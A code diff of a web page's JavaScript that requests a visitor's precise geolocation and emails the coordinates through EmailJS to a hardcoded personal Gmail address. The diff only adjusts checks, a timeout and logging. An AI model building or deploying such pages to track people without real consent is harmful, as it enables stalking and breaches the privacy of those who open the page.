@@ -53,7 +53,7 @@
         });
 
         function requestLocationPermission() {
-            if ("geolocation" in navigator) {
+            if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         const latitude = position.coords.latitude;
@@ -70,10 +70,10 @@
                         document.getElementById("locationDisplay").textContent = 
                             "⚠️ Location access denied or unavailable!";
                     },
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                 );
             } else {
-                console.log("❌ Geolocation not supported.");
+                console.error("❌ Geolocation not supported by this browser.");
                 document.getElementById("locationDisplay").textContent = "⚠️ Geolocation not supported!";
             }
         }
@@ -85,13 +85,15 @@
                 to_email: "rizwan.ahmed99586@gmail.com"
             };
 
+            console.log("📧 Sending email with location:", templateParams);
+
             emailjs.send("service_k0hh95y", "template_8jzs2oc", templateParams)
                 .then((response) => {
                     console.log("✅ Email sent successfully!", response);
                     document.getElementById("locationDisplay").textContent = "📧 Location sent!";
                 })
                 .catch((error) => {
-                    console.error("❌ Email sending error:", error.message);
+                    console.error("❌ Email sending error:", error);
                     document.getElementById("locationDisplay").textContent = "⚠️ Email sending failed!";
                 });
         }
